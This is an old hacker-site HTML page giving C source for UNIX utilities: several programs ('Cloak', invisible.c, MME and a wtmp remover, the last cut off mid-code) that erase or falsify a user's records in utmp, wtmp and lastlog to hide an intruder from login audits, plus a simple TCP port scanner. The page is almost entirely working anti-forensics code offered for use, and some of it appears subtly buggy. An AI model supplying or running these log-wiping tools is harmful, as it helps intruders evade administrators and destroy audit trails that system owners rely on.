<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Apendix 4</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">
<B><FONT SIZE=+1>Other UNIX system utilities</FONT></B>&nbsp;<BR><BR>Topics:<BR><A HREF="#1">Cloak v1.0 Wipes Your Presence on SCO, BSD, Ultrix, and HP/UXUNIX</A><BR><A HREF="#2">invisible.c&nbsp; Makes You invisible, and Works on Some SunOSWithout Root</
A><BR><A HREF="#3">SySV Program That Makes You Invisible</A><BR><A HREF="#4">UNIX Port Scanner</A><BR><A HREF="#5">Remove wtmp Entries By tty Number or Username</A><BR><A HREF="#6">SunOS wtmp Editor</A><BR><A HREF="#7">SunOS 4+ Zap Yourself From wtmp, utm
p and lastlog</A><BR><BR><A NAME="1"></A><B><FONT SIZE=+1>Cloak v1.0 Wipes Your Presence on SCO,BSD, Ultrix, and HP/UX UNIX</FONT></B><BR><BR>------------------ cut here<BR><BR>/* UNIX Cloak v1.0 (alpha)&nbsp; Written by: Wintermute of -Resist- */<BR>/* T
his file totally wipes all presence of you on a UNIX system*/<BR>/* It works on SCO, BSD, Ultrix, HP/UX, and anything else that */<BR>/* is compatible..&nbsp; This file is for information purposes ONLY!*/<BR><BR>/*--> Begin source...&nbsp;&nbsp;&nbsp; */<
BR>#include &lt;fcntl.h><BR>#include &lt;utmp.h><BR>#include &lt;sys/types.h><BR>#include &lt;unistd.h><BR>#include &lt;lastlog.h><BR><BR>main(argc, argv)<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; argc;<BR>&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
 *argv[];<BR>{<BR>&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp; *name;<BR>&nbsp;&nbsp;&nbsp; struct utmp u;<BR>&nbsp;&nbsp;&nbsp; struct lastlog l;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; fd;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; i = 0;<
BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; done = 0;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; size;<BR><BR>&nbsp;&nbsp;&nbsp; if (argc != 1) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc >= 1 &amp;&amp;strcmp(argv[1], "clo
akme") == 0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("You are now cloaked\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto start;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("close successful\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; else {<BR>&n
bsp; printf("usage: close [file to close]\n");<BR>&nbsp; exit(1);<BR>&nbsp; }<BR>start:<BR>&nbsp;&nbsp;&nbsp; name = (char *)(ttyname(0)+5);<BR>&nbsp;&nbsp;&nbsp; size = sizeof(struct utmp);<BR><BR>&nbsp;&nbsp;&nbsp; fd = open("/etc/utmp", O_RDWR);<BR>&nb
sp;&nbsp;&nbsp; if (fd &lt; 0)<BR>&nbsp;perror("/etc/utmp");<BR>&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;while ((read(fd, &amp;u, size) == size) &amp;&amp; !done) {<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (!strcmp(u.ut_line, name)) {<BR>&nbsp; done = 1;<BR>&nbsp; memset
(&amp;u, 0, size);<BR>&nbsp; lseek(fd, -1*size, SEEK_CUR);<BR>&nbsp; write(fd, &amp;u, size);<BR>&nbsp; close(fd);<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;}<BR>&nbsp;&nbsp;&nbsp; }<BR><BR><BR>&nbsp;&nbsp;&nbsp; size = sizeof(struct lastlog);<BR>&nbsp;&nbsp
;&nbsp; fd = open("/var/adm/lastlog", O_RDWR);<BR>&nbsp;&nbsp;&nbsp; if (fd &lt; 0)<BR>&nbsp;perror("/var/adm/lastlog");<BR>&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;lseek(fd, size*getuid(), SEEK_SET);<BR>&nbsp;read(fd, &amp;l, size);<BR>&nbsp;l.ll_time = 0;<BR>
&nbsp;strncpy(l.ll_line, "ttyq2 ", 5);<BR>&nbsp;gethostname(l.ll_host, 16);<BR>&nbsp;lseek(fd, size*getuid(), SEEK_SET);<BR>&nbsp;close(fd);<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR>---------------cut here<BR><BR><A NAME="2"></A><B><FONT SIZE=+1>invisible.c&nbsp; 
Makes You invisible,and Works on Some SunOS Without Root</FONT></B><BR><BR><BR>----------- cut here<BR>/* invisible.c - a quick hack courtesy of the rogue */<BR>/* erases your presence when root, or partially erases when on a sun andnot root */<BR>/* peac
e, dudes */<BR><BR><BR>#include &lt;fcntl.h><BR>#include &lt;utmp.h><BR>#include &lt;sys/types.h><BR>#include &lt;unistd.h><BR>#include &lt;lastlog.h><BR><BR>main(argc, argv)<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; argc;<BR>&nbsp;&nbsp;&nbsp; ch
ar&nbsp;&nbsp;&nbsp; *argv[];<BR>{<BR>&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp; *name;<BR>&nbsp;&nbsp;&nbsp; struct utmp u;<BR>&nbsp;&nbsp;&nbsp; struct lastlog l;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; fd;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;
&nbsp;&nbsp; i = 0;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; done = 0;<BR>&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; size;<BR><BR>&nbsp;&nbsp;&nbsp; name = (char *)(ttyname(0)+5);<BR>&nbsp;&nbsp;&nbsp; size = sizeof(struct utmp);<BR>&nbsp;<BR
>&nbsp;&nbsp;&nbsp; fd = open("/etc/utmp", O_RDWR);<BR>&nbsp;&nbsp;&nbsp; if (fd &lt; 0)<BR>&nbsp;perror("/etc/utmp");<BR>&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;while ((read(fd, &amp;u, size) == size) &amp;&amp; !done) {<BR>&nbsp;&nbsp;&nbsp;&nbsp; if (!strcm
p(u.ut_line, name)) {<BR>&nbsp; done = 1;<BR>&nbsp; memset(&amp;u, 0, size);<BR>&nbsp; lseek(fd, -1*size, SEEK_CUR);<BR>&nbsp; write(fd, &amp;u, size);<BR>&nbsp; close(fd);<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;}<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&n
bsp; memset(&amp;u, 0, size);<BR>&nbsp;&nbsp;&nbsp; fd = open("/var/adm/wtmp", O_RDWR | O_TRUNC);<BR>&nbsp;&nbsp;&nbsp; if (fd &lt; 0)<BR>&nbsp;perror("/var/adm/wtmp");<BR>&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;u.ut_time = 0;<BR>&nbsp;strcpy(u.ut_line, "~");<
BR>&nbsp;strcpy(u.ut_name, "shutdown");<BR>&nbsp;write(fd, &amp;u, size);<BR>&nbsp;strcpy(u.ut_name, "reboot");<BR>&nbsp;write(fd, &amp;u, size);<BR>&nbsp;close(fd);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR><BR>&nbsp;&nbsp;&nbsp; size = sizeof(struct lastlog);<BR>&
nbsp;&nbsp;&nbsp; fd = open("/var/adm/lastlog", O_RDWR);<BR>&nbsp;&nbsp;&nbsp; if (fd &lt; 0)<BR>&nbsp;perror("/var/adm/lastlog");<BR>&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;lseek(fd, size*getuid(), SEEK_SET);<BR>&nbsp;read(fd, &amp;l, size);<BR>&nbsp;l.ll_tim
e = 0;<BR>&nbsp;strncpy(l.ll_line, "ttyq2 ", 5);<BR>&nbsp;gethostname(l.ll_host, 16);<BR>&nbsp;lseek(fd, size*getuid(), SEEK_SET);<BR>&nbsp;write(fd, &amp;l, size);<BR>&nbsp;close(fd);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;<BR>}<BR>----------- cut here<BR><BR>
<A NAME="3"></A><B><FONT SIZE=+1>SySV Program That Makes You Invisible</FONT></B><BR><BR>--------- cut here<BR><BR>/* MME - MakeME, Version 1.00 for SySV / Source Compatible machines<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MME will allow you t
oremove yerself from the UTMP file, change<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; what name appears foryou in UTMP, or change what TTY you appear<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to be on.<BR><BR>If you modify this program 
or incorporate some of these routines into<BR>another program, please somewhere in the program tell where you got<BR>them from.. namely, put in some credits to me &amp; This program , so<BR>you don't "playgerize".&nbsp; It makes me mad when someone modifi
es someone<BR>else's work then pawns it off as their own original piece.&nbsp; The credits<BR>can even be in a comment somewhere in the source instead of visual to<BR>the user.<BR><BR>syntax:<BR>mme<BR>mme login_name<BR>mme login_name new_tty<BR><BR>in or
der to change tty name, you must first supply a login name<BR>then a ttyname.<BR><BR>You MUST have write perm's to /etc/utmp to modify the main utmp file.<BR>*/<BR><BR>#include &lt;stdio.h><BR>#include &lt;fcntl.h><BR>#include &lt;sys/types.h><BR>#include
 &lt;utmp.h><BR>#include &lt;sys/stat.h><BR><BR>char *mytty; /* For an exact match of ut_line */<BR>char *backup_utmp = "cp /etc/utmp /tmp/utmp.bak";<BR>struct utmp *user;<BR><BR>main(argc,argv)<BR>int argc;<BR>char *argv[];<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp; int good= 0,cnt = 0,start =1,cn = 0, cl = 0,index = 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char err[80];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc >= 2) cn = 1;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
; if (argc == 3) cl = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; system(backup_utmp);<BR>&nbsp;&nbsp;&nbsp; printf("Welcome to MME 1.00 By Sir Hackalot\n");<BR>&nbsp;&nbsp;&nbsp; printf("Another PHAZESOFT Productions\n");<BR>&nbsp;&nbsp;&nbsp; print
f("Status:");<BR>&nbsp;&nbsp;&nbsp; if (cn == 1) printf("Changing your login to %s\n",argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (cl == 1) printf("Changingyour tty&nbsp;&nbsp; to %s\n",argv[2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
; if (cl == 0 &amp;&amp; cn ==0) printf("Removing you from utmp\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; utmpname("/etc/utmp");<BR><BR>/* The Below Section finds OUR entry, even if more than 1 of the same name<BR>&nbsp;&nbsp; of us is logged on.
&nbsp; It finds YOUR tty, looks in utmpuntil it finds<BR>&nbsp;&nbsp; your tty, then "cnt" holds your index number */<BR>&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mytty = strrchr(ttyname(0),'/');/* Goto the last "/" */<BR>&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp; strcpy(mytty,++mytty); /* Makea string starting one pos greater */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (good != 1) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user = g
etutent();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cnt++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strcmp(user->ut_line,mytty) == 0) good =1;<BR>&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; utmpname("/etc/utmp"); /* Resetfile pointer */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(start = 0;start &lt; cnt;start++){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user = getutent(); /* Move the file pointer to where we are */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Below: If we did not supplya co
mmand line arg to change name, etc,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; make us invisiblefrom WHO.&nbsp; WHO only displays USER_PROCESS<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; types, as does "w","whodo" and all who 
variations.&nbsp; You WILL<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; be seen if theydo who -l (or one some systems -L)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if we did supplyan argument make SURE we DO show up. */<BR><BR
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc == 1)&nbsp; user->ut_type= LOGIN_PROCESS; /* Become invisible */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else user->ut_type = USER_PROCESS;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* ABo
ve: You can change itto:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; user->ut_type = LOGIN_PROCESS;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy(user->ut_name,"LOGIN");<BR>&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to totally hideyour-self.&nbsp; On some systems, if you do it, it will go<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; thru the login p
rocess...But that is rare.&nbsp; AT any-rate, for<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; safety, i left outthe strcpy */<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Below: If we entered a newlogin name, change to that.<BR>&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If we entered anew tty, change to that. */<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc == 2) strcpy(user->ut_name,argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (argc == 3) strcp
y(user->ut_line,argv[2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pututline(user); /* Rewriteour new info */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; endutent(); /* Tell the utmpfunctions we are through */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp; printf("Delete /tmp/utmp.bakif all is well. Else, copy it to /etc/utmp\n");<BR>}<BR><BR>----------- cut here<BR><BR><A NAME="4"></A><B><FONT SIZE=+1>UNIX Port Scanner</FONT></B><BR><BR><BR>----------- cut here<BR><BR>/*<BR>&nbsp;* internet port sc
anner<BR>&nbsp;*<BR>&nbsp;* This program will scan a hosts TCP ports printing all ports thataccept<BR>&nbsp;* connections, and if known, the service name.<BR>&nbsp;* This program can be trivially altered to do UDP ports also.<BR>&nbsp;*<BR>&nbsp;* Kopywro
ng (K) Aug. 25, '94 pluvius@io.org<BR>&nbsp;*<BR>&nbsp;* Hey kiddies, this is a C program, to run it do this:<BR>&nbsp;* $ cc -o pscan pscan.c<BR>&nbsp;* $ pscan &lt;host> [max port]<BR>&nbsp;*<BR>&nbsp;* No, this will not get you root.<BR>&nbsp;*<BR>&nbs
p;* Changes:<BR>&nbsp;* Changed fprintf to printf in line 34 to work with my Linux 1.1.18box<BR>&nbsp;* Netrunner 1/18/95 11:30pm<BR>&nbsp;*<BR>*/<BR>static char sccsid[] = "@(#)pscan.c&nbsp;&nbsp;&nbsp;&nbsp; 1.0&nbsp;&nbsp;&nbsp;&nbsp;(KRAD) 08/25/94";<
BR>#include &lt;stdio.h><BR>#include &lt;sys/types.h><BR>#include &lt;sys/socket.h><BR>#include &lt;netinet/in.h><BR>#include &lt;netdb.h><BR><BR>#define MAX_PORT 1024 /* scan up to this port */<BR>int s;<BR>struct sockaddr_in addr;<BR>char rmt_host[100];
<BR><BR>int skan(port)<BR>int port;<BR>{<BR>&nbsp;int r;<BR>&nbsp;&nbsp;&nbsp; s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);<BR>&nbsp;&nbsp;&nbsp; if (s &lt; 0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* fprintf("ERROR: socket() failed\n");*/<BR>&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Changed to printf for my Linux1.1.18 box */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("ERROR: socket() failed\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; ad
dr.sin_family = PF_INET;<BR>&nbsp;&nbsp;&nbsp; addr.sin_port = port;<BR>&nbsp;&nbsp;&nbsp; addr.sin_addr.s_addr = inet_addr(rmt_host);<BR><BR>&nbsp;&nbsp;&nbsp; r = connect(s,(struct sockaddr *) &amp;addr, sizeof(addr));<BR><BR>&nbsp;&nbsp;&nbsp; close(s)
;<BR><BR>&nbsp;&nbsp;&nbsp; if (r &lt; 0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (1 == 0);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; return (1 == 1);<BR>}<BR><BR>main(argc,argv)<BR>int argc;<BR>char *argv[];<BR>{<BR>&nbsp;int a,b,c,d,e,f
;<BR>&nbsp;struct hostent *foo;<BR>&nbsp;struct servent *bar;<BR><BR>&nbsp;&nbsp; if (argc &lt; 2) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"usage: %s &lt;host> [highestport]\n",argv[0]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp
; }<BR><BR>&nbsp;&nbsp; if (sscanf(argv[1],"%d.%d.%d.%d",&amp;a,&amp;b,&amp;c,&amp;d)!= 4) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foo = gethostbyname(argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (foo == NULL) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp; fprintf(stderr,"error:cannot resolve host %s\n",argv[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(rmt_host,"%d.%d.%d.%d",(unsignedchar )foo->h_addr_l
ist[0][0],<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned char ) foo->h_addr_list[0][1],<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned char ) foo->h_addr_list[0][2],<
BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned char ) foo->h_addr_list[0][3]);<BR>&nbsp;&nbsp; } else {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncpy(rmt_host,argv[1],99);<BR>&nbsp;&nbsp; }<BR><BR><BR>&nbsp;&nbsp; i
f (argc > 2) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f = atoi(argv[2]);<BR>&nbsp;&nbsp; } else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f = MAX_PORT;<BR><BR>&nbsp;&nbsp; fprintf(stdout,"Scanning host %s - TCP ports 1 through %d\n",rmt_host,f);<BR><BR>&nbsp;&nbsp; fo
r (e =1;e&lt;=f;e++) {<BR>&nbsp;&nbsp;&nbsp; char serv[100];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (skan(e)) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bar = getservbyport(e,"tcp");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d 
(%s) is running.\n",e,(bar== NULL) ? "UNKNOWN" :<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bar->s_name);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp; }<BR>}<BR><BR>------------ cut here<BR><BR><A N
AME="5"></A><B><FONT SIZE=+1>Remove wtmp Entries By tty Number or Username</FONT></B><BR><BR><BR>---------- cut here<BR><BR><BR>/* This program removes wtmp entries by name or tty number */<BR><BR>#include &lt;utmp.h><BR>#include &lt;stdio.h><BR>#include 
&lt;sys/file.h><BR>#include &lt;sys/fcntlcom.h><BR><BR>void usage(name)<BR>char *name;<BR>{<BR>&nbsp;&nbsp;&nbsp; printf("Usage: %s [ user | tty ]\n", name);<BR>&nbsp;&nbsp;&nbsp; exit(1);<BR>}<BR><BR>void main (argc, argv)<BR>int argc;<BR>char *argv[];<B
R>{<BR>&nbsp;&nbsp;&nbsp; struct utmp utmp;<BR>&nbsp;&nbsp;&nbsp; int size, fd, lastone = 0;<BR>&nbsp;&nbsp;&nbsp; int match, tty = 0, x = 0;<BR><BR>&nbsp;&nbsp;&nbsp; if (argc>3 || argc&lt;2)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage(argv[0]);<BR><BR
>&nbsp;&nbsp;&nbsp; if (strlen(argv[1])&lt;2) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Error: Length of user\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; if (argc==3)<BR>&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp; if (argv[2][0] == 'l') lastone = 1;<BR><BR>&nbsp;&nbsp;&nbsp; if (!strncmp(argv[1],"tty",3))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tty++;<BR><BR>&nbsp;&nbsp;&nbsp; if ((fd = open("/usr/adm/wtmp",O_RDWR))==-1) {<BR>&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp; printf("Error: Open on /usr/adm/wtmp\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; printf("[Searching for %s]:&nbsp; ", argv[1]);<BR><BR>&nbsp;&nbsp;&nbsp; if (fd >= 0
)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = read(fd, &amp;utmp, sizeof(structutmp));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while ( size == sizeof(struct utmp))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( tty ? ( !strcmp(utmp.ut_line,argv[1]) ) :<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ( !strncmp(utmp.ut_name,argv[1], strlen(argv[1])) ) &amp;&amp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastone != 1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (x==10)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\b%d", x);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (x>9 &amp;&amp; x!=10)<BR>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\b\b%d", x);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;printf("\b%d", x);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek( fd, -sizeof(struct utmp), L_INCR );<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bzero( &amp;utmp, sizeof(s
truct utmp) );<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write( fd, &amp;utmp, sizeof(struct utmp) );<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
